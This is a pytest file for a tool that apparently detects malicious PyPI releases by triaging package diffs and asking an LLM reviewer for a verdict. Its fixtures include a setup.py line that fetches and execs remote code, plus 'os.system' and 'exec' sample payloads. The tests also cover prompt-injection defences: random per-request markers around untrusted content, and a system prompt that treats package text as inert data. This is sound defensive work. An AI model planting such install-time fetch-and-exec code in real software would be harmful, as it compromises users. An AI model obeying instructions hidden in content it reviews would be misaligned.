import re
from pydiffwatch.models import Diff, FileDiff, Hunk, FiredRule, TriageResult
from pydiffwatch import reviewer

# Per-request untrusted-content marker: fixed public affix + 128-bit (32 hex char) CSPRNG nonce.
_MARKER_RE = re.compile(r"===DW-UNTRUSTED-[0-9a-f]{32}===")


def _diff(is_first=False):
    h = Hunk((0, 0), (0, 3), ["import os", "import requests", "exec(requests.get(U).text)"], [])
    return Diff("evilpkg", "1.3.0", is_first, [FileDiff("setup.py", "modified", [h])], [])


def _triage():
    return TriageResult(60.0, [FiredRule("combo:fetch+exec", 45.0, "setup.py", (1, 3))], True)


def test_input_names_package_and_includes_flagged_content():
    text = reviewer.build_review_input(_diff(), _triage(), max_chars=10_000)
    assert "evilpkg" in text and "1.3.0" in text
    assert "setup.py" in text                       # file pointer surfaced
    assert "exec(requests.get(U).text)" in text


def test_input_surfaces_locations_not_verdict_labels():
    # De-priming: the reviewer gets WHERE to look (file:line) but not WHAT to conclude — the triage
    # rule names/weights are withheld so a weak model can't echo the label into attack_type.
    text = reviewer.build_review_input(_diff(), _triage(), max_chars=10_000)
    assert "flagged_locations:" in text
    assert "setup.py:1-3" in text                   # file:line pointer present
    assert "combo:fetch+exec" not in text           # rule NAME withheld
    assert "fired_triage_rules" not in text         # old verdict-shaped header gone
    assert "(w=" not in text                        # rule weights withheld


def test_system_prompt_frames_triage_as_noisy():
    sp = reviewer.SYSTEM_PROMPT.lower()
    assert "over-flag" in sp or "noisy" in sp or "false positive" in sp
    assert "independent" in sp or "verify" in sp


def test_untrusted_content_wrapped_in_per_request_marker():
    # The marker appears exactly 3x (declaration + open + close), all identical, and the package
    # content sits between the open and close occurrences.
    text = reviewer.build_review_input(_diff(), _triage(), max_chars=10_000)
    markers = _MARKER_RE.findall(text)
    assert len(markers) == 3 and len(set(markers)) == 1
    body = text.split(markers[0])[2]            # 3 markers -> 4 segments; body is between open & close
    assert "exec(requests.get(U).text)" in body


def test_marker_is_fresh_per_request():
    # CSPRNG nonce -> a distinct marker every call (defeats delimiter-forgery: attacker can't predict it).
    a = _MARKER_RE.findall(reviewer.build_review_input(_diff(), _triage(), max_chars=10_000))[0]
    b = _MARKER_RE.findall(reviewer.build_review_input(_diff(), _triage(), max_chars=10_000))[0]
    assert a != b


def test_marker_stays_out_of_cached_system_prompt():
    # The per-request nonce must live in the (uncached) user message, NOT the frozen cached system
    # prompt — otherwise every request gets a unique system prompt and prompt-caching is defeated.
    text = reviewer.build_review_input(_diff(), _triage(), max_chars=10_000)
    marker = _MARKER_RE.findall(text)[0]
    assert marker not in reviewer.SYSTEM_PROMPT
    sp = reviewer.SYSTEM_PROMPT.lower()
    assert "marker" in sp and "user message" in sp   # system prompt frames the rule generically


def test_input_includes_is_first_release_flag():
    assert "first release" in reviewer.build_review_input(_diff(is_first=True), _triage(), max_chars=10_000).lower()


def test_input_truncates_over_cap_with_note():
    big = "X" * 50_000
    h = Hunk((0, 0), (0, 1), [big], [])
    d = Diff("p", "1.0", False, [FileDiff("setup.py", "modified", [h])], [])
    text = reviewer.build_review_input(d, _triage(), max_chars=2_000)
    assert len(text) <= 2_000 + len(reviewer.TRUNCATION_NOTE) + 200
    assert reviewer.TRUNCATION_NOTE in text


def test_first_release_caps_to_top_40_files():
    files = [FileDiff(f"m{i}.py", "added", [Hunk((0, 0), (0, 1), [f"x{i}=1"], [])]) for i in range(60)]
    rules = [FiredRule("primitives", float(60 - i), f"m{i}.py", (1, 1)) for i in range(60)]
    d = Diff("p", "1.0", True, files, [])
    tr = TriageResult(100.0, rules, True)
    text = reviewer.build_review_input(d, tr, max_chars=1_000_000)
    assert "m0.py" in text and "m59.py" not in text


def test_build_evidence_renders_flagged_payload():
    # Self-contained takedown evidence: package/version header + the flagged file's diff with the
    # actual payload lines. No injection markers (internal storage, not LLM input).
    text = reviewer.build_evidence(_diff(), _triage(), max_chars=10_000)
    assert "evilpkg" in text and "1.3.0" in text
    assert "setup.py" in text
    assert "exec(requests.get(U).text)" in text
    assert reviewer._MARKER_AFFIX not in text   # no injection delimiter in stored evidence


def test_build_evidence_empty_when_only_metadata_rules():
    # Binary/foreign/dep/maintainer rules carry lines==(0,0) and reference files not in diff.changed;
    # they have no code to render, so evidence is empty (their metadata is already stored elsewhere).
    d = Diff("p", "1.0", False, [], [])
    tr = TriageResult(40.0, [FiredRule("dep-typosquat", 40.0, "reqursts", (0, 0))], True)
    assert reviewer.build_evidence(d, tr, max_chars=10_000) == ""


def test_build_evidence_excludes_unflagged_files():
    # Only files that drew a code rule are rendered, not every changed file.
    flagged = FileDiff("setup.py", "modified",
                       [Hunk((0, 0), (0, 1), ["os.system('id')"], [])])
    benign = FileDiff("README.md", "modified",
                      [Hunk((0, 0), (0, 1), ["just docs"], [])])
    d = Diff("p", "1.0", False, [flagged, benign], [])
    tr = TriageResult(45.0, [FiredRule("combo:fetch+exec", 45.0, "setup.py", (1, 1))], True)
    text = reviewer.build_evidence(d, tr, max_chars=10_000)
    assert "os.system('id')" in text and "just docs" not in text


def test_build_evidence_includes_oversized_top_file_truncated():
    # The single highest-weight flagged file alone exceeds the cap (a whole-file first-release scan).
    # Evidence must still carry the payload (truncated), never collapse to an empty header — a takedown
    # report needs the actual code.
    big = ["exec(EVIL_PAYLOAD)"] + ["x = 1"] * 5000
    d = Diff("p", "1.0", False, [FileDiff("setup.py", "added", [Hunk((0, 0), (0, 5001), big, [])])], [])
    tr = TriageResult(45.0, [FiredRule("primitives+obfuscation", 45.0, "setup.py", (1, 5001))], True)
    text = reviewer.build_evidence(d, tr, max_chars=2_000)
    assert "exec(EVIL_PAYLOAD)" in text
    assert reviewer.TRUNCATION_NOTE in text
    assert len(text) <= 2_000 + len(reviewer.TRUNCATION_NOTE) + 200


def test_build_evidence_respects_max_chars():
    big = "X" * 50_000
    d = Diff("p", "1.0", False, [FileDiff("setup.py", "modified", [Hunk((0, 0), (0, 1), [big], [])])], [])
    tr = TriageResult(45.0, [FiredRule("primitives+obfuscation", 45.0, "setup.py", (1, 1))], True)
    text = reviewer.build_evidence(d, tr, max_chars=2_000)
    assert len(text) <= 2_000 + len(reviewer.TRUNCATION_NOTE) + 200
    assert reviewer.TRUNCATION_NOTE in text


def test_system_prompt_declares_content_inert():
    from pydiffwatch import reviewer
    sp = reviewer.SYSTEM_PROMPT.lower()
    assert "inert" in sp or "data, not instructions" in sp or "never instructions" in sp
    # taxonomy + the injection-defense framing must be present
    assert "malicious" in sp and "benign" in sp
    assert "<<<" not in reviewer.SYSTEM_PROMPT  # no static/forgeable delimiter baked into the prompt


def test_system_prompt_de_trusts_self_description():
    # The reviewer must judge observable behavior over the package's stated purpose — hardening against
    # the cover-story misses (buildit-argus "observability SDK", msdocx "DOCX library"). Keyword guard so
    # the clause can't silently regress.
    sp = reviewer.SYSTEM_PROMPT.lower()
    assert "stated purpose" in sp
    assert "telemetry" in sp and "observability" in sp
    assert "exfiltration" in sp


def test_review_schema_is_forced_structured_contract():
    from pydiffwatch import reviewer
    s = reviewer.REVIEW_SCHEMA
    assert s["additionalProperties"] is False
    props = s["properties"]
    assert props["classification"]["enum"] == ["malicious", "suspicious", "benign"]
    assert "none" in props["attack_type"]["enum"]
    assert props["recommended_action"]["enum"] == ["report-to-pypi", "monitor", "dismiss"]
    assert set(s["required"]) == set(props.keys())


def test_review_schema_emits_decision_fields_before_prose():
    # Reasoning models that count thinking inside the output budget can truncate the JSON tail. Order
    # the schema so the decision fields land first and only the verbose prose is at risk if truncated.
    from pydiffwatch import reviewer
    keys = list(reviewer.REVIEW_SCHEMA["properties"].keys())
    assert keys[0] == "classification"
    for decision in ("urgent", "recommended_action", "attack_type"):
        assert keys.index(decision) < keys.index("reasoning")
        assert keys.index(decision) < keys.index("cited_hunk")


import pytest
from pydiffwatch.config import Config, ReviewerConfig


class _FakeBackend:
    """A scripted review backend (replaces the SDK-specific fake client). primary/escalation_model
    mimic a backend's model identity; complete() returns the next scripted JSON or raises."""
    def __init__(self, scripted, primary="claude-sonnet-4-6", escalation="claude-opus-4-8"):
        self.scripted = list(scripted)
        self.primary_model = primary
        self.escalation_model = escalation
        self.calls = []
    def complete(self, **kw):
        self.calls.append(kw)
        item = self.scripted.pop(0)
        if isinstance(item, Exception): raise item
        return item


def _verdict_json(classification="malicious", confidence=0.95, urgent=True):
    import json
    return json.dumps({"classification": classification, "confidence": confidence,
                       "attack_type": "install-hook-rce", "reasoning": "fetch+exec in setup.py",
                       "cited_hunk": "setup.py:1-3", "recommended_action": "report-to-pypi",
                       "urgent": urgent})


def test_default_reviewer_uses_local_backend():
    # No backend injected + default Config -> local Qwen, single model, no escalation (no key needed).
    r = reviewer.Reviewer(Config())
    assert r.backend.primary_model == "qwen-singleshot" and r.backend.escalation_model is None


def test_review_parses_structured_verdict():
    r = reviewer.Reviewer(Config(), backend=_FakeBackend([_verdict_json()]))
    v = r.review(_diff(), _triage())
    assert v.classification == "malicious" and v.attack_type == "install-hook-rce"
    assert v.cited_hunk == "setup.py:1-3" and v.urgent is True
    assert v.model == "claude-sonnet-4-6"
    assert v.package == "evilpkg" and v.score == 60.0


def test_review_clamps_out_of_range_confidence():
    r = reviewer.Reviewer(Config(), backend=_FakeBackend([_verdict_json(confidence=1.7)]))
    assert r.review(_diff(), _triage()).confidence == 1.0


def test_unknown_attack_type_clamped_to_none():
    # A loose/prompt-only endpoint can emit an attack_type synonym outside our enum; it must not sink
    # the verdict — clamp the informational field to "none" while preserving the classification.
    import json
    bad = json.dumps({"classification": "malicious", "confidence": 0.9, "urgent": True,
                      "recommended_action": "report-to-pypi", "attack_type": "data-theft",
                      "cited_hunk": "setup.py:1-3", "reasoning": "r"})
    v = reviewer.Reviewer(Config(), backend=_FakeBackend([bad])).review(_diff(), _triage())
    assert v.attack_type == "none" and v.classification == "malicious"


def test_low_confidence_escalates_when_backend_has_escalation_model():
    cfg = Config(reviewer=ReviewerConfig(opus_escalation_confidence=0.6))
    fb = _FakeBackend([_verdict_json(classification="suspicious", confidence=0.3),
                       _verdict_json(classification="malicious", confidence=0.92)])
    v = reviewer.Reviewer(cfg, backend=fb).review(_diff(), _triage())
    assert v.model == "claude-opus-4-8" and v.classification == "malicious"
    assert fb.calls[0]["model"] == "claude-sonnet-4-6"
    assert fb.calls[1]["model"] == "claude-opus-4-8"


def test_high_confidence_does_not_escalate():
    fb = _FakeBackend([_verdict_json(confidence=0.95)])
    reviewer.Reviewer(Config(), backend=fb).review(_diff(), _triage())
    assert len(fb.calls) == 1


def test_local_backend_never_escalates_even_on_low_confidence():
    # Single-model local backend (escalation_model=None) must not attempt a second call.
    fb = _FakeBackend([_verdict_json(classification="suspicious", confidence=0.1)],
                      primary="qwen-singleshot", escalation=None)
    v = reviewer.Reviewer(Config(), backend=fb).review(_diff(), _triage())
    assert len(fb.calls) == 1 and v.model == "qwen-singleshot"


def test_backend_unavailable_propagates_as_review_unavailable():
    fb = _FakeBackend([reviewer.ReviewUnavailable("down")])
    with pytest.raises(reviewer.ReviewUnavailable):
        reviewer.Reviewer(Config(), backend=fb).review(_diff(), _triage())


def test_reviewer_passes_schema_and_system_prompt_to_backend():
    fb = _FakeBackend([_verdict_json()])
    reviewer.Reviewer(Config(), backend=fb).review(_diff(), _triage())
    kw = fb.calls[0]
    assert kw["schema"] is reviewer.REVIEW_SCHEMA
    assert kw["system"] is reviewer.SYSTEM_PROMPT
    assert kw["max_tokens"] == Config().reviewer.max_output_tokens
